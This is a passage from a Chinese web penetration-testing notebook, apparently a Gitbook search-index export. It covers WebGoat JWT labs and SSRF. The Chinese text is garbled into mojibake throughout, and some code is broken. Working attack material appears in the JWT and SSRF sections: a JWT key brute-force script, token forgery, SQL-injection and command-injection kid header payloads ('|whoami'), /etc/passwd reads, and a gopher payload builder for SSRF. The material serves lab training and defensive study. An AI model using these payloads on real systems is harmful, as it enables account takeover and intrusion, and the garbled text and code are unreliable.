è®¾ç½®ç”¨äºç­¾åJWTçš„å¯†é’¥ã€‚JWT_PASSWORDå˜é‡åº”åŒ…å«ç”¨äºç­¾åJWTçš„ç›¸åŒå¯†é’¥ã€‚ parseClaimsJws(accessToken) è§£æåŒ…å«åœ¨accessTokenå˜é‡ä¸­çš„JWTï¼Œå¹¶å°†å…¶ä½œä¸ºJwså¯¹è±¡è¿”å›ã€‚Claimså¯¹è±¡åŒ…å«JWTçš„æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸åŒ…æ‹¬å…³äºç”¨æˆ·çš„ä¿¡æ¯ä»¥åŠæˆæƒè¯·æ±‚æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æä¾›çš„å¯†é’¥æ— æ³•éªŒè¯JWTï¼Œåˆ™parseClaimsJws()æ–¹æ³•å°†æŠ›å‡ºSignatureExceptionã€‚ å¼±å¯†é’¥ WebGoat JWT 10 å·¥å…· ./jwtcrack JWTæ•°æ® hashcat pythonè„šæœ¬ ''' 1.è‹¥ç­¾åç›´æ¥æ ¡éªŒæˆåŠŸï¼Œåˆ™ key_ ä¸ºæœ‰æ•ˆå¯†é’¥ï¼› 2.è‹¥å› æ•°æ®éƒ¨åˆ†é¢„å®šä¹‰å­—æ®µé”™è¯¯ï¼ˆjwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œè¯´æ˜å¹¶éå¯†é’¥é”™è¯¯å¯¼è‡´ï¼Œåˆ™ key_ ä¹Ÿä¸ºæœ‰æ•ˆå¯†é’¥ï¼› 3.è‹¥å› å¯†é’¥é”™è¯¯ï¼ˆjwt.exceptions.InvalidSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œåˆ™ key_ ä¸ºæ— æ•ˆå¯†é’¥ï¼› 4.è‹¥ä¸ºå…¶ä»–åŸå› ï¼ˆå¦‚ï¼ŒJWT å­—ç¬¦ä¸²æ ¼å¼é”™è¯¯ï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œæ ¹æœ¬æ— æ³•éªŒè¯å½“å‰ key_ æ˜¯å¦æœ‰æ•ˆã€‚ ''' import jwt #import termcolor # æç¤ºé‡Œç»™çš„å­—å…¸https://github.com/first20hours/google-10000-english dict_path = 'path/10000_en_words.txt' JWT_STR = R'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0' if __name__ == \"__main__\": jwt_str = JWT_STR with open(dict_path) as f: key_ = line.strip() try: jwt.decode(jwt_str, verify=True, key=key_) #print('\\r', '\\bbingo! found key -->', termcolor.colored(key_, 'green'), '', termcolor.colored(key_, 'green'), ' import jwt token = jwt.encode( { \"iss\": \"WebGoat Token Builder\", \"aud\": \"webgoat.org\", \"iat\": 1686136171, \"exp\": 1786136231, # ä¿®æ”¹jwtåˆ°æœŸæ—¶é—´ \"sub\": \"tom@webgoat.org\", \"username\": \"WebGoat\", # æŒ‰é¢˜ç›®è¦æ±‚ä¿®æ”¹åå­— \"Email\": \"tom@webgoat.org\", \"Role\": [ \"Manager\", \"Project Administrator\" ] } ,algorithm=\"HS256\",key=\"available\") print(token) å°†ç”Ÿæˆçš„tokenæäº¤å³å¯ è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ å½¢æˆåŸå›  æœªæ ¡éªŒaccess tokenå’Œrefresh tokenæ˜¯å¦å±äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´Aç”¨æˆ·å¯ä½¿ç”¨è‡ªå·±çš„refresh tokenå»åˆ·æ–°Bç”¨æˆ·çš„access token å®éªŒ WebGoat JWT 12 é¢˜ç›®ç»™å‡ºäº†Tomçš„æ—§token ç”¨jerryè®¿é—®å¾—åˆ°refresh tokenï¼ˆå¯†ç åœ¨æºç é‡Œï¼‰ ç”¨jerryçš„refresh token å»åˆ·æ–°Tomçš„access token å¸¦ä¸Šå¾—åˆ°çš„accesstokenï¼Œå»è´­ç‰© ä¿®å¤ è·Ÿè¸ªå“ªä¸ªaccess tokenå±äºå“ªä¸ªrefresh token,è¿˜å¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€æˆ–åœ°ç†ä½ç½®ã€‚ KIDæ³¨å…¥ WebGoat JWT 13 æŸ¥çœ‹å¯¹åº”æºç  Jwt jwt =Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() { xxxxxxx }).parseClaimsJws(token); Claims claims = (Claims) jwt.getBody(); String username = (String) claims.get(\"username\"); if (\"Jerry\".equals(username)) { return failed(this).feedback(\"jwt-final-jerry-account\").build(); } if (\"Tom\".equals(username)) { return success(this).build(); } else { return failed(this).feedback(\"jwt-final-not-tom\").build(); } } catch (JwtException e) { return failed(this).feedback(\"jwt-invalid-token\").output(e.toString()).build(); } é€»è¾‘ï¼šè·å–å¯†é’¥ï¼Œç„¶åè§£ætokenï¼Œè·å¾—claimsä¸­çš„usernameï¼Œå¦‚æœä¸ºTomåˆ™åˆ é™¤æˆåŠŸã€‚ å…³é”®ï¼šè·å–å¯†é’¥çš„éƒ¨åˆ† new SigningKeyResolverAdapter() { @Override public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) { final String kid = (String) header.get(\"kid\"); try (var connection = dataSource.getConnection()) { // é€šè¿‡æŸ¥è¯¢kidæ¥è·å¾—keyï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨sqlæ³¨å…¥ ResultSet rs =connection.createStatement().executeQuery(\"SELECT key FROM jwt_keys WHERE id = '\" + kid + \"'\"); while (rs.next()) { // è¿”å›base64è§£ç åçš„key return TextCodec.BASE64.decode(rs.getString(1)); } } catch (SQLException e) { errorMessage[0] = e.getMessage(); } return null; } æ­£å¸¸çš„æ€è·¯æ˜¯é€šè¿‡å¯¹kidå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼Œä¼ªé€ key SELECT key FROM jwt_keys WHERE id = '\" + kid + \"' å› ä¸ºTomçš„jwtä¸­kidä¸ºwebgoat_keyï¼Œè¯´æ˜åœ¨jwt_keysè¡¨ä¸­æœ‰ä¸€ä¸ªidçš„å€¼ä¸ºwebgoat_keyã€‚ æ‰€ä»¥å¯ä»¥å¯¹kidæ³¨å…¥ kid: y' and 1=2 union select id from jwt_keys where id ='webgoat_key è¿™æ ·sqlæŸ¥è¯¢çš„ç»“æœå°±ä¸ºwebgoat_keyï¼Œå³keyä¸ºwebgoat_keyï¼Œä½†æ˜¯å› ä¸º TextCodec.BASE64.decode(rs.getString(1)); æ— æ³•å¯¹webgoat_keyè¿›è¡Œbase64è§£ç ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ ç”¨webgoat_keyä½œä¸ºkey é€šè¿‡æºç å¾—åˆ°çœŸæ­£çš„keyä¸º key = base64.b64decode(\"qwertyqwerty1234\") payload import jwt import base64 # payload token_dict = { \"iat\": 1529569536, \"iss\": \"WebGoat Token Builder\", \"exp\": 2018905304, \"aud\": \"webgoat.org\", \"sub\": \"jerry@webgoat.com\", \"username\": \"Tom\", \"Email\": \"jerry@webgoat.com\", \"Role\": [\"Cat\"] } key = base64.b64decode(\"qwertyqwerty1234\") # headers headers = { \"typ\": \"JWT\", # \"kid\": \"123' and 1=2 union select id FROM jwt_keys WHERE id='webgoat_key\", \"kid\": \"webgoat_key\", \"alg\": \"HS256\" } # è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token jwt_token = jwt.encode(payload=token_dict, # payload, æœ‰æ•ˆè½½ä½“ key=key, # è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥ algorithm=\"HS256\", # æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256 headers=headers # json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´) ).decode('ascii') # python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr print(jwt_token) åˆ©ç”¨ é€‰æ‹©å“ªç§æ–¹æ³•ï¼Œå–å†³äºåç«¯æ˜¯å¦‚ä½•åˆ©ç”¨kidæ¥æ‰¾åˆ°å¯¹åº”å¯†é’¥ #ç›®å½•éå† { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } #sqlæ³¨å…¥ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"aaaaaaa' UNION SELECT 'key';-- \" #å‘½ä»¤æ‰§è¡Œ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/path/to/key_file|whoami\" } å¯¹ç§°åŠ å¯†ç»•è¿‡--å…¬é’¥æ³„éœ² JWTä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•ä¸ºHMACå’ŒRSA HMAC(HS256):æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§˜å¯†å¯†é’¥å¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ RSA(RS256)ï¼šæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†æ˜æ–‡ï¼Œå…¬é’¥è§£å¯†å¯†æ–‡ã€‚ å¦‚æœå¯¹æ–¹ç½‘ç«™åŸæ¥ä½¿ç”¨çš„æ˜¯RS256ï¼Œä½†æ˜¯æ³„éœ²äº†å…¬é’¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å…¬é’¥ç”Ÿæˆç­¾åï¼Œå¹¶ä¸”å°†algçš„å€¼æ”¹ä¸ºHS256ï¼Œå› ä¸ºHS256ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥ç½‘ç«™å°±ä¼šä½¿ç”¨è¯¥å…¬é’¥éªŒè¯ç­¾åï¼Œè‡ªç„¶ç­¾åå¯ä»¥é€šè¿‡éªŒè¯ã€‚ å‚è€ƒæ–‡ç«  https://jwt.io/introduction http://www.xianxianlabs.com/blog/2018/06/03/96.html https://www.freebuf.com/vuls/216457.html Tips ä¸çŸ¥é“èº«ä»½æ£€éªŒçš„å‚æ•° é€šè¿‡æ³¨é”€ç™»å½•çš„è¿”å›åŒ…ä¸­çš„setcookieå¯ä»¥çŸ¥é“ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:42:17 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/04.OAUTH.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/04.OAUTH.html","title":"04.OAUTH","keywords":"","body":"Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 17:03:08 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/05.ä¸€äº›æ¡ˆä¾‹.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/05.èº«ä»½è®¤è¯/05.ä¸€äº›æ¡ˆä¾‹.html","title":"05.ä¸€äº›æ¡ˆä¾‹","keywords":"","body":"ä»»æ„è´¦æˆ·ç»‘å®šå¾®ä¿¡é€»è¾‘ç¼ºé™·æ¡ˆä¾‹ https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496658&idx=1&sn=a962d7f0a95d295e95082d39881b8d9a&chksm=e8a5f9b1dfd270a74ea0acbd11f75a1fd1c66ba1ab0d89497b95e7db43d459349e75863cba67&scene=58&subscene=0#rd Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-23 09:48:09 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/06.APIæ¥å£æµ‹è¯•/01.å‰ç½®çŸ¥è¯†.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/06.APIæ¥å£æµ‹è¯•/01.å‰ç½®çŸ¥è¯†.html","title":"01.å‰ç½®çŸ¥è¯†","keywords":"","body":"Jquery WebPack TIPï¼šå¾ˆå¤šAPIæ¥å£æ–‡æ¡£éƒ½è—åœ¨äºŒçº§ï¼Œä¸‰çº§ï¼Œå››çº§ç”šè‡³äº”çº§ç›®å½•ä¸‹ï¼ˆdruidä»€ä¹ˆçš„ä¹Ÿæ˜¯ï¼‰ï¼Œæ¨èä½¿ç”¨burpè¢«åŠ¨æ‰«æï¼Œæ‰«æå‡ºæ¥åå¯ä»¥ä½¿ç”¨å·¥å…·æˆ–è€…æ‰‹å·¥è¿›è¡Œæ¥å£æµ‹è¯• APIkitï¼šä¸èƒ½ä½¿ç”¨åŸå§‹è¯·æ±‚å¤´ï¼Œåªä¿ç•™äº†Cookieï¼Œè¢«åŠ¨æ‰«æä¸èƒ½å…³é—­ Routevulscanï¼šä¸èƒ½æ§åˆ¶æ‰«æå±‚æ•°ï¼Œbypassæœ‰ç‚¹é—®é¢˜ onescanï¼šé«˜åº¦è‡ªå®šä¹‰ï¼Œç¼ºå°‘bypass æˆ‘è¿™é‡Œé€‰æ‹©onescan+è‡ªå®šä¹‰bypasså­—å…¸ï¼Œç„¶åå¯ä»¥ç”¨APIkitæ¥æµ‹è¯•æ¥å£ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 15:53:42 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/06.APIæ¥å£æµ‹è¯•/03.Tips.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/06.APIæ¥å£æµ‹è¯•/03.Tips.html","title":"03.Tips","keywords":"","body":"å…ˆè¿›å…¥åå°ç•Œé¢ï¼Œå†å¼¹å‡ºæ ¡éªŒç•Œé¢ï¼Œå¯ä»¥å°è¯•dropæ‰è¯¥æ ¡éªŒæ•°æ®åŒ… æ±‚åŠ©å¯¹æœªæˆæƒçš„â€œç™»å½•è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•â€ç«™ç‚¹åˆ©ç”¨æ–¹å¼ - T00ls.Com åŸºæœ¬æµç¨‹ æ”¶é›†æ¥å£ æ‰¾ä¸€æ‰¾æ³„æ¼çš„æ¥å£ æ³„æ¼çš„apiæ–‡æ¡£ï¼Œæ¯”å¦‚swaggeræ¥å£æ–‡æ¡£ ç›®æ ‡å…¬å¸çš„å¼€å‘è€…å¹³å° SourceMap supersearchplus urlfinder HAE æ”¶é›†å®Œåï¼Œç¡®å®šå¥½BaseDir APIæ¥å£æµ‹è¯•å·¥å…· ReadyAPI packerfuzzer swagger-exp supersearchplus https://app.apifox.com/ å¸¸è§æµ‹è¯•ç‚¹ é‰´æƒç›¸å…³ æœªæˆæƒè®¿é—® æ°´å¹³/å‚ç›´è¶Šæƒ é‰´æƒæ•°æ®ç¼ºé™·ï¼Œå¦‚JWT å¸¸è§æµ‹è¯•æ¥å£ upload ç”¨æˆ·æŸ¥è¯¢æ¥å£ï¼Œå¸¦å‚æ•°pageï¼Œsizeçš„ download login sqlæ³¨å…¥ åç«¯ç»„ä»¶æ¼æ´ï¼šå¦‚fastjsonï¼Œlog4j å“åº”æ•°æ®åŒ…ä¿¡æ¯æ³„æ¼ï¼šæ•æ„Ÿä¿¡æ¯ï¼Œç»„ä»¶ç‰ˆæœ¬å·ï¼Œå‚æ•°æ³„æ¼ æ¥å£FUZZ é€šè¿‡å·²çŸ¥çš„æ¥å£ï¼ŒçŒœæµ‹æœªçŸ¥æ¥å£ å¦‚çœ‹åˆ°imageUploadå¯ä»¥è¯•è¯•fileUploadï¼Œencryptlistâ†’list â€‹ å€ŸåŠ©AIç”Ÿæˆç¬¦åˆå‘½åè§„å¾‹çš„æ¥å£åç§°è¿›è¡ŒFUZZ æ¥å£å‚æ•°çˆ†ç ´ å“åº”åŒ…ä¸­è¿”å›ç¼ºå¤±ä»€ä¹ˆå‚æ•°ï¼Œåªèƒ½æ¥å—å“ªç§content-typeï¼ˆcontent-typeä¹Ÿå¯ä»¥çˆ†ç ´ï¼‰ å…¶ä»–æ¡ˆä¾‹ /api/users/current/profile/email åœ¨å¼€å‘è€…ç»å¸¸ä¼šç”¨currentå’Œmeè¿™ç§å…³é”®å­—,å¯ä»¥å°è¯•åˆ©ç”¨ç”¨æˆ·id(æ•°å­—)æ¥æ›¿ä»£current # å°†currentå˜ä¸ºä¸åŒç”¨æˆ·çš„id /api/users/1234/profile/email å‰ç«¯APIæœåŠ¡å™¨å¤„ç†è¯¥è¯·æ±‚æ—¶ï¼Œä¼šè§£æå…è®¸è¯·æ±‚é€šè¿‡çš„â€œcurrentâ€å…³é”®å­—ï¼Œå¹¶å°†å…¶è½¬å‘ç»™åç«¯APIæœåŠ¡å™¨,å½“åç«¯ API æ”¶åˆ°è¯·æ±‚æ—¶ /api/users/current/profile/email â†’ /api/users/1234/profile/email è¶Šæƒæµ‹è¯• /api/users/current/../1235/profile/email Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 22:20:03 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/07.SSRF/SSRF.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/07.SSRF/SSRF.html","title":"SSRF","keywords":"","body":"æ¼æ´åŸç† SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåˆ©ç”¨æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼ˆæ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œå¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚ æ¼æ´å±å®³ å†…ç½‘ä¸»æœºï¼Œç«¯å£ï¼ŒæœåŠ¡ç­‰ä¿¡æ¯æ”¶é›† fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ æ”»å‡»å†…ç½‘çš„åº”ç”¨ç¨‹åºåŠæœåŠ¡ å¸¸è§åœºæ™¯ ä¸‹è½½å›¾ç‰‡ã€ä¸‹è½½æ–‡ä»¶ç­‰ä¸‹è½½å¤„ï¼› æ–‡ä»¶é¢„è§ˆã€å›¾ç‰‡é¢„è§ˆç­‰è·å–å›¾ç‰‡ã€æ–‡ä»¶å†…å®¹å¤„ï¼› åœ¨çº¿è¯†å›¾ï¼Œåœ¨çº¿æ–‡æ¡£ç¿»è¯‘ï¼Œåˆ†äº«ï¼Œè®¢é˜…ç­‰ï¼› æ ¹æ®è¿œç¨‹URLä¸Šä¼ ï¼Œé™æ€èµ„æºå›¾ç‰‡ç­‰ï¼› æ•°æ®åº“çš„å†…ç½®åŠŸèƒ½ï¼Œæ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°ï¼› URLå…³é”®å­—ä¸­ï¼Œæ¯”å¦‚ï¼šsourceï¼Œshareï¼Œlinkï¼Œsrcï¼Œimageurlï¼Œtargetç­‰ï¼› From å›½å…‰å¸ˆå‚…çš„ssrfé¶åœºæ‹“æ‰‘å›¾ 172.72.23.21 è¿™ä¸ªæœåŠ¡å™¨çš„ Web 80 ç«¯å£å­˜åœ¨ SSRF æ¼æ´ï¼Œå¹¶ä¸” 80 ç«¯å£æ˜ å°„åˆ°äº†å…¬ç½‘çš„ 8080ï¼Œæ­¤æ—¶æ”»å‡»è€…é€šè¿‡è¿™ä¸ª 8080 ç«¯å£å¯ä»¥å€ŸåŠ© SSRF æ¼æ´å‘èµ·å¯¹ 172 ç›®æ ‡å†…ç½‘çš„æ¢æµ‹å’Œæ”»å‡»ã€‚ æ¼æ´åˆ©ç”¨ æ£€æµ‹åˆ°å­˜åœ¨SSRFæ¼æ´å æ¢æµ‹ä¸»æœºå­˜æ´»æƒ…å†µ æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£æƒ…å†µ æ ¹æ®ç«¯å£æƒ…å†µå°è¯•æ”»å‡» æ³¨æ„ç‚¹ æ”»å‡»çš„æ•°æ®éœ€è¦ç»è¿‡ä¸¤æ¬¡URLç¼–ç ï¼Œå› ä¸ºæ•°æ®æ˜¯å…ˆåˆ°è¾¾æœ‰SSRFæ¼æ´çš„ä¸»æœºï¼Œå†é€šè¿‡SSRFæ¼æ´è½¬äº¤ç»™å†…ç½‘å…¶ä»–ä¸»æœºå¤„ç†ã€‚ å¸¸ç”¨åè®®ä»‹ç» curl cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ã€‚ å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚ curl -v www.baidu.com -vï¼šæ˜¾ç¤ºè¯·æ±‚å¤´å’Œå“åº”å¤´ curl -V å¯ä»¥çœ‹åˆ°æ”¯æŒçš„åè®®å¦‚ä¸‹ dict file ftp pop3 pop3s ftos gopher gophers rtmp rtsp http https imap scp sftp imaps ldap ldaps smb smbs smtp smtps telnet tftp mtt gopher gopher åè®®æ˜¯ä¸€ä¸ªåœ¨http åè®®è¯ç”Ÿå‰ç”¨æ¥è®¿é—®Internet èµ„æºçš„åè®®å¯ä»¥ç†è§£ä¸ºhttp åè®®çš„å‰èº«æˆ–ç®€åŒ–ç‰ˆï¼Œæ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œå¯ä»¥å®ç°å¤šä¸ªæ•°æ®åŒ…æ•´åˆå‘é€ï¼Œç„¶ågopher æœåŠ¡å™¨å°†å¤šä¸ªæ•°æ®åŒ…æ†ç»‘ç€å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯å®ƒçš„èœå•å“åº”ã€‚æ¯”å¦‚ä½¿ç”¨ä¸€æ¡gopher åè®®çš„curl å‘½ä»¤å°±èƒ½æ“ä½œmysql æ•°æ®åº“æˆ–å®Œæˆå¯¹redis çš„æ”»å‡»ç­‰ç­‰ã€‚ å‘ç‚¹ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ curl gopher://localhost:2222/khaz%0atest%0ahaha â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ nc -lvp 2222 listening on [any] 2222 ... connect to [127.0.0.1] from localhost [127.0.0.1] 50546 haz test haha ä¼šå‘ç°æ¥æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯åˆ†è¡Œçš„ï¼Œè€Œä¸”ç¬¬ä¸€è¡Œåªæ¥æ”¶åˆ°äº†hazï¼Œkè¢«â€˜åƒæ‰â€™äº†ã€‚ æ‰€ä»¥åœ¨ä½¿ç”¨gopheråè®®æ—¶éœ€è¦åœ¨urlååŠ å…¥ä¸€ä¸ªä»»æ„å­—ç¬¦æ‰è¡Œã€‚ get/postè¯·æ±‚ 1ã€æ„é€ HTTPæ•°æ®åŒ… 2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a, 3ã€å‘é€gopheråè®® æ³¨æ„HTTPæ•°æ®åŒ…ä¸­å¿…é¡»è¦æœ‰ä¸‹é¢å››ä¸ªè¯·æ±‚å¤´ POST /1.php HTTP/1.1 Host: 192.168.244.128 Content-Type: application/x-www-form-urlencoded Content-Length: 6 a=khaz import urllib.parse #è½¬æ¢è„šæœ¬ uri = '/flag.php' host = '127.0.0.1:80' content = 'key=90bb4d9d9946905d6d9d68358d7c0360' content_length = len(content) test =f\"\"\"POST {uri} HTTP/1.1 Host: {host} Content-Type: application/x-www-form-urlencoded Content-Length: {content_length} {content}\"\"\" first = urllib.parse.quote(test)#urlç¼–ç  second = first.replace('%0A','%0D%0A')# \\n â†’ \\r\\n third = urllib.parse.quote(second) payload = 'gopher://{}/_'.format(host)+third+\"%0D%0A\" #gopheråè®®ä¼šåƒæ‰urlåé¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ print(payload) ä¾‹å­ é€šè¿‡å‘½ä»¤å‘èµ· //1.php kali gopher://192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A é€šè¿‡curlå‡½æ•°å‘èµ·--ä¸¤æ¬¡urlç¼–ç  //ssrf.php windows ç›´æ¥ç”¨é€šè¿‡å‘½ä»¤å‘èµ·çš„payloadï¼ˆä¸€æ¬¡urlç¼–ç ï¼‰ï¼Œå‘ç°æ— å›æ˜¾ ?url=gopher://192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A å†æ¬¡è¿›è¡Œurlç¼–ç åå‘é€ï¼Œå‘ç°æ˜¯å¯ä»¥å›æ˜¾çš„ã€‚ ```php ?url=gopher%3A%2F%2F192.168.244.128%3A80%2F_POST%2520%2F1.php%2520HTTP%2F1.1%250D%250AHost%253A%2520192.168.244.128%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%25206%250D%250A%250D%250Aa%253Dkhaz%250D%250A ``` http/https æ¢æµ‹Web åº”ç”¨çš„ä¿¡æ¯æƒ…å†µ file è¯»å–æœ¬åœ°æ–‡ä»¶ file:///etc/passwd file:///etc/hosts # è®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå # é«˜æƒé™ file:///proc/net/arp # è®°å½•ARPåè®®å†…å®¹ï¼Œé‡Œé¢æœ‰ä¸»æœºçš„ipå’Œmacåœ°å€ file:///etc/network/interfaces # å¤§éƒ¨åˆ†ç½‘ç»œæ¥å£é…ç½® dict æ¢æµ‹ç«¯å£æœåŠ¡ https://blog.51cto.com/u_15127673/4130760 dict åè®®æ˜¯ä¸€ä¸ªåœ¨çº¿ç½‘ç»œå­—å…¸åè®®ï¼Œç”¨æ¥æ¶è®¾å­—å…¸æœåŠ¡çš„ã€‚ å®ƒæ˜¯åŸºäºTCPåè®®å¼€å‘çš„ï¼Œæ‰€ä»¥åƒ mysql çš„æœåŠ¡ï¼Œå› ä¸ºä¹Ÿæ˜¯åŸºäº tcp åè®®å¼€å‘ï¼Œæ‰€ä»¥ç”¨ dict åè®®çš„æ–¹å¼æ‰“å¼€èƒ½å¼ºè¡Œè¯»å–ä¸€äº› mysql æœåŠ¡çš„è¿”å›å†…å®¹ >> PS D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test> D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.3.4nts/php.exe \"d:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\2.php\" J 5.7.26U'+I2J%mkwB\"M)7 Imysql_native_password!#08S01Got packets out of order å¯ä»¥çœ‹åˆ°5.7.26å’Œmysql â€‹ åˆ©ç”¨æ¡ˆä¾‹ Fastcgi https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list https://www.freebuf.com/articles/web/263342.html FPMæ˜¯ä»€ä¹ˆ å½“æˆ‘ä»¬çš„webæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚phpæ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼Œå°±è®©php-fpmæŠŠå…¶è§£é‡Š(ç¿»è¯‘)æˆhtmlæ 